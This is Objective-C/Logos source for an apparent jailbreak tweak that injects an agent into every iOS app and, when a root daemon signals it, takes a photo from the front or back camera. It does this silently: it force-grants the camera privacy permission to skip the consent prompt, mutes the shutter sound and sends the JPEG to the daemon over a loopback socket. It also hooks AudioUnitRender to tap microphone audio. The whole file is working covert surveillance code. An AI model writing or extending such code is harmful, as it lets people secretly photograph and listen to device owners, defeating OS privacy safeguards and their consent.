// rctlapp — app-side media agent injected into every app. It brokers the daemon's
// per-app media access from inside the FRONTMOST app (the only valid camera/mic
// client). Camera: on a Darwin-notification pulse from rctld the active app grabs a
// still, writes /tmp/rctl_cam.jpg, and pulses a "done" notification. AVFoundation is
// driven via the runtime (dlopen'd lazily so we don't load it into every app); the
// NSBundle hook supplies the camera usage string so the privacy check never aborts
// the host app, and a gated TCC hook force-grants access just for our snap. The
// microphone (listen + inject) lands here next, for the same reason: the active app
// is where the mic actually lives.
#import <UIKit/UIKit.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <notify.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <unistd.h>
#import <AudioToolbox/AudioToolbox.h>
#import <substrate.h>
#import "CameraAgent.h"
#include <stdatomic.h>

// Mute the camera shutter for OUR snaps only. AVCaptureStillImageOutput plays a
// system sound on capture; gRctlSnapping is set just around our captureStillImage
// call so the host app's own sounds are untouched. We suppress ALL system sounds
// in that brief window so the shutter is caught whatever its sound id. (typedef so
// the block-typed completion parameter parses in %hookf.)
typedef void (^RctlSoundDone)(void);
static BOOL gRctlSnapping = NO;
// Force the camera TCC check to "granted" ONLY during our snap, so the capture
// works in any app (even one whose camera permission is notDetermined/denied)
// without the system "<App> wants to access the Camera" prompt. Gated by
// gRctlCapturing, so the host app's own camera-permission behaviour is untouched
// the rest of the time. TCCAccessPreflight/Request live in the private TCC
// framework, so we resolve + hook them via dlsym/MSHookFunction (see %ctor).
static _Atomic bool gRctlCapturing = false;
void rctl_camera_tcc_set_active(BOOL active) { atomic_store(&gRctlCapturing, active); }
static int (*orig_TCCAccessPreflight)(CFStringRef, CFDictionaryRef);
static void (*orig_TCCAccessRequest)(CFStringRef, CFDictionaryRef, void (^)(BOOL));
static int rctl_TCCAccessPreflight(CFStringRef service, CFDictionaryRef options) {
    if (atomic_load(&gRctlCapturing) && service && CFStringCompare(service, CFSTR("kTCCServiceCamera"), 0) == kCFCompareEqualTo)
        return 0; // kTCCAccessPreflightGranted
    return orig_TCCAccessPreflight ? orig_TCCAccessPreflight(service, options) : 2;
}
static void rctl_TCCAccessRequest(CFStringRef service, CFDictionaryRef options, void (^completion)(BOOL)) {
    if (atomic_load(&gRctlCapturing) && service && CFStringCompare(service, CFSTR("kTCCServiceCamera"), 0) == kCFCompareEqualTo) {
        if (completion) completion(YES);
        return;
    }
    if (orig_TCCAccessRequest) orig_TCCAccessRequest(service, options, completion);
    else if (completion) completion(NO);
}
%hookf(void, AudioServicesPlaySystemSound, SystemSoundID sid) {
    (void)sid;
    if (gRctlSnapping) return;
    %orig;
}
%hookf(void, AudioServicesPlaySystemSoundWithCompletion, SystemSoundID sid, RctlSoundDone block) {
    (void)sid;
    if (gRctlSnapping) { if (block) block(); return; }
    %orig;
}

// Send the JPEG to the root daemon over a RAW loopback socket. A sandboxed App
// Store app can't write /tmp and ATS blocks NSURLSession http://, but a raw socket
// to 127.0.0.1 is exempt from ATS and allowed by the app sandbox's outbound rules.
static void rctl_upload(NSData *jpeg) {
    if (!jpeg.length) return;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(8080); a.sin_addr.s_addr = htonl(0x7f000001);
    if (connect(fd, (struct sockaddr *)&a, sizeof a) == 0) {
        char hdr[200];
        int hn = snprintf(hdr, sizeof hdr,
            "POST /v1/cam_upload HTTP/1.1\r\nHost: x\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n",
            (unsigned long)jpeg.length);
        write(fd, hdr, hn);
        const uint8_t *p = (const uint8_t *)jpeg.bytes; size_t left = jpeg.length;
        while (left > 0) { ssize_t w = write(fd, p, left); if (w <= 0) break; p += (size_t)w; left -= (size_t)w; }
    }
    close(fd);
}

static void caplog(NSString *s) { (void)s; }   // diagnostics off for production

static void rctl_capture(int position) {
    dispatch_async(dispatch_get_main_queue(), ^{
      @try {
        NSString *pn = [[NSProcessInfo processInfo] processName];
        UIApplication *app = [UIApplication sharedApplication];
        long st = app ? [app applicationState] : -1;
        caplog([NSString stringWithFormat:@"NOTIFY recv proc=%@ state=%ld", pn, st]);   // who heard it
        // SpringBoard also gets us injected and reports Active, but it can't be a
        // camera client (it just fails and races the real app for the device) — skip it.
        if ([pn isEqualToString:@"SpringBoard"]) return;
        if (!app || st != UIApplicationStateActive) { return; }   // only the frontmost app acts
        caplog([NSString stringWithFormat:@"FIRE pos=%d state=%ld", position, st]);
        atomic_store(&gRctlCapturing, true);   // force-grant camera TCC just for this snap
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ atomic_store(&gRctlCapturing, false); });
        dlopen("/System/Library/Frameworks/AVFoundation.framework/AVFoundation", RTLD_LAZY);
        Class CDev = NSClassFromString(@"AVCaptureDevice");
        Class CInput = NSClassFromString(@"AVCaptureDeviceInput");
        Class CSession = NSClassFromString(@"AVCaptureSession");
        Class CStill = NSClassFromString(@"AVCaptureStillImageOutput");
        if (!CDev || !CInput || !CSession || !CStill) { caplog(@"no AVF classes"); return; }
        long auth = ((long (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"authorizationStatusForMediaType:"), @"vide");
        caplog([NSString stringWithFormat:@"authStatus=%ld", auth]);

        id chosen = nil;
        NSArray *devs = ((id (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"devicesWithMediaType:"), @"vide");
        for (id d in devs) { long p = ((long (*)(id, SEL))objc_msgSend)(d, NSSelectorFromString(@"position")); if (p == position) { chosen = d; break; } }
        if (!chosen) chosen = ((id (*)(id, SEL, id))objc_msgSend)((id)CDev, NSSelectorFromString(@"defaultDeviceWithMediaType:"), @"vide");
        if (!chosen) { caplog(@"no device"); return; }

        NSError *err = nil;
        id input = ((id (*)(id, SEL, id, NSError **))objc_msgSend)((id)CInput, NSSelectorFromString(@"deviceInputWithDevice:error:"), chosen, &err);
        if (!input) { caplog([NSString stringWithFormat:@"no input: %@", err]); return; }
        id session = ((id (*)(id, SEL))objc_msgSend)(((id (*)(id, SEL))objc_msgSend)((id)CSession, NSSelectorFromString(@"alloc")), NSSelectorFromString(@"init"));
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"setSessionPreset:"), @"AVCaptureSessionPresetPhoto");
        if (!((BOOL (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"canAddInput:"), input)) return;
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"addInput:"), input);
        id out = ((id (*)(id, SEL))objc_msgSend)(((id (*)(id, SEL))objc_msgSend)((id)CStill, NSSelectorFromString(@"alloc")), NSSelectorFromString(@"init"));
        ((void (*)(id, SEL, id))objc_msgSend)(out, NSSelectorFromString(@"setOutputSettings:"), @{ @"AVVideoCodecKey": @"jpeg" });
        if (!((BOOL (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"canAddOutput:"), out)) return;
        ((void (*)(id, SEL, id))objc_msgSend)(session, NSSelectorFromString(@"addOutput:"), out);
        ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"startRunning"));

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
          @try {
            BOOL run = ((BOOL (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"isRunning"));
            id conn = ((id (*)(id, SEL, id))objc_msgSend)(out, NSSelectorFromString(@"connectionWithMediaType:"), @"vide");
            caplog([NSString stringWithFormat:@"running=%d conn=%d", run, conn != nil]);
            if (!conn) { ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning")); return; }
            // Match the photo to the device/app orientation (else it's sideways in
            // landscape). UIInterfaceOrientation 1..4 maps 1:1 to AVCaptureVideoOrientation.
            long io = ((long (*)(id, SEL))objc_msgSend)([UIApplication sharedApplication], NSSelectorFromString(@"statusBarOrientation"));
            if (io >= 1 && io <= 4 && ((BOOL (*)(id, SEL))objc_msgSend)(conn, NSSelectorFromString(@"isVideoOrientationSupported")))
                ((void (*)(id, SEL, long))objc_msgSend)(conn, NSSelectorFromString(@"setVideoOrientation:"), io);
            void (^done)(void *, NSError *) = ^(void *sbuf, NSError *e) {
              @try {
                NSData *jpeg = sbuf ? ((id (*)(id, SEL, void *))objc_msgSend)((id)CStill, NSSelectorFromString(@"jpegStillImageNSDataRepresentation:"), sbuf) : nil;
                caplog([NSString stringWithFormat:@"completion jpeg=%lu err=%@", (unsigned long)jpeg.length, e]);
                if (jpeg.length) rctl_upload(jpeg);   // raw-socket loopback POST to the daemon
              } @catch (id e) {}
              ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning"));
            };
            gRctlSnapping = YES;   // mute the shutter for this snap
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ gRctlSnapping = NO; });
            @try { ((void (*)(id, SEL, id, id))objc_msgSend)(out, NSSelectorFromString(@"captureStillImageAsynchronouslyFromConnection:completionHandler:"), conn, done); }
            @catch (NSException *ex) { caplog([NSString stringWithFormat:@"capture threw %@", ex.reason]); ((void (*)(id, SEL))objc_msgSend)(session, NSSelectorFromString(@"stopRunning")); }
          } @catch (id e) {}
        });
      } @catch (id e) {}
    });
}

static void cam_cb(CFNotificationCenterRef c, void *obs, CFStringRef name, const void *obj, CFDictionaryRef info) {
    int pos = (CFStringCompare(name, CFSTR("com.greatlove.rctl.cam.front"), 0) == kCFCompareEqualTo) ? 2 : 1;
    rctl_capture(pos);
}

// ---- Phase A mic probe -------------------------------------------------------
// We don't yet know which AudioUnitRender (bus/scope) carries the mic inside the
// app. Hook it (lazily, on mic.on), and while probing log each non-silent render's
// format/bus/scope/peak to the daemon (the app sandbox can't write /tmp, so we POST
// over the loopback like the camera does). The daemon log then reveals the tap point.
static BOOL gMicProbe = NO;
static OSStatus (*orig_AURender_app)(AudioUnit, AudioUnitRenderActionFlags *,
                                     const AudioTimeStamp *, UInt32, UInt32, AudioBufferList *) = NULL;

static void rctl_applog(const char *text) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(8080); a.sin_addr.s_addr = htonl(0x7f000001);
    if (connect(fd, (struct sockaddr *)&a, sizeof a) == 0) {
        size_t tl = strlen(text);
        char hdr[160];
        int hn = snprintf(hdr, sizeof hdr,
            "POST /v1/applog HTTP/1.1\r\nHost: x\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n", tl);
        (void)write(fd, hdr, hn); (void)write(fd, text, tl);
    }
    close(fd);
}
static void rctl_applog_async(const char *line) {   // never block the realtime audio thread
    NSString *s = [NSString stringWithUTF8String:line];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{ rctl_applog(s.UTF8String); });
}

static OSStatus rctl_hook_AURender_app(AudioUnit unit, AudioUnitRenderActionFlags *flags,
                                       const AudioTimeStamp *ts, UInt32 bus, UInt32 nframes,
                                       AudioBufferList *io) {
    OSStatus st = orig_AURender_app(unit, flags, ts, bus, nframes, io);
    if (!gMicProbe || st != noErr || !io || io->mNumberBuffers == 0) return st;
    static unsigned n = 0;
    if ((++n & 0x1f) != 0) return st;   // ~1 in 32 to keep it light
    AudioStreamBasicDescription fmt; UInt32 sz = sizeof fmt; const char *scope = "out";
    if (AudioUnitGetProperty(unit, kAudioUnitProperty_StreamFormat, kAudioUnitScope_Output, bus, &fmt, &sz) != noErr || sz < sizeof fmt) {
        scope = "in"; sz = sizeof fmt;
        if (AudioUnitGetProperty(unit, kAudioUnitProperty_StreamFormat, kAudioUnitScope_Input, bus, &fmt, &sz) != noErr) return st;
    }
    long peak = 0;
    AudioBuffer *b = &io->mBuffers[0];
    if (b->mData && b->mDataByteSize) {
        if ((fmt.mFormatFlags & kAudioFormatFlagIsSignedInteger) && fmt.mBitsPerChannel == 16) {
            const int16_t *s = (const int16_t *)b->mData; uint32_t c = b->mDataByteSize / 2;
            for (uint32_t i = 0; i < c; i++) { int v = s[i] < 0 ? -s[i] : s[i]; if (v > peak) peak = v; }
        } else if (fmt.mBitsPerChannel == 32) {
            const float *fp = (const float *)b->mData; uint32_t c = b->mDataByteSize / 4;
            for (uint32_t i = 0; i < c; i++) { float v = fp[i] < 0 ? -fp[i] : fp[i]; long iv = (long)(v * 32767.0f); if (iv > peak) peak = iv; }
        }
    }
    char line[256];
    snprintf(line, sizeof line, "MICPROBE proc=%s bus=%u nbuf=%u frames=%u rate=%.0f ch=%u bits=%u scope=%s peak=%ld",
             [[[NSProcessInfo processInfo] processName] UTF8String] ?: "?", (unsigned)bus,
             (unsigned)io->mNumberBuffers, (unsigned)nframes, fmt.mSampleRate,
             (unsigned)fmt.mChannelsPerFrame, (unsigned)fmt.mBitsPerChannel, scope, peak);
    rctl_applog_async(line);
    return st;
}

static void mic_cb(CFNotificationCenterRef c, void *obs, CFStringRef name, const void *obj, CFDictionaryRef info) {
    BOOL on = (CFStringCompare(name, CFSTR("com.greatlove.rctl.mic.on"), 0) == kCFCompareEqualTo);
    gMicProbe = on;
    if (on && !orig_AURender_app) {
        void *sym = dlsym(RTLD_DEFAULT, "AudioUnitRender");
        if (sym) { MSHookFunction(sym, (void *)rctl_hook_AURender_app, (void **)&orig_AURender_app);
                   rctl_applog_async("MICPROBE hook installed"); }
    }
    rctl_applog_async(on ? "MICPROBE on" : "MICPROBE off");
}

// Supply NSCameraUsageDescription for the host app's main bundle so the camera
// privacy check never SIGABRTs the app (apps without the key would otherwise crash).
%hook NSBundle
- (id)objectForInfoDictionaryKey:(NSString *)key {
    if ([key isEqualToString:@"NSCameraUsageDescription"] && self == [NSBundle mainBundle]) return @"rctl camera";
    return %orig;
}
%end

%ctor {
    @try {
        caplog(@"LOADED");
        CFNotificationCenterRef nc = CFNotificationCenterGetDarwinNotifyCenter();
        CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.back"),  NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(nc, NULL, cam_cb, CFSTR("com.greatlove.rctl.cam.front"), NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(nc, NULL, mic_cb, CFSTR("com.greatlove.rctl.mic.on"),  NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        CFNotificationCenterAddObserver(nc, NULL, mic_cb, CFSTR("com.greatlove.rctl.mic.off"), NULL, CFNotificationSuspensionBehaviorDeliverImmediately);
        void *tcc = dlopen("/System/Library/PrivateFrameworks/TCC.framework/TCC", RTLD_LAZY);
        if (tcc) {
            void *pf = dlsym(tcc, "TCCAccessPreflight");
            if (pf) MSHookFunction(pf, (void *)rctl_TCCAccessPreflight, (void **)&orig_TCCAccessPreflight);
            void *rq = dlsym(tcc, "TCCAccessRequest");
            if (rq) MSHookFunction(rq, (void *)rctl_TCCAccessRequest, (void **)&orig_TCCAccessRequest);
        }
        rctl_camera_agent_initialize();
    } @catch (id e) {}
}
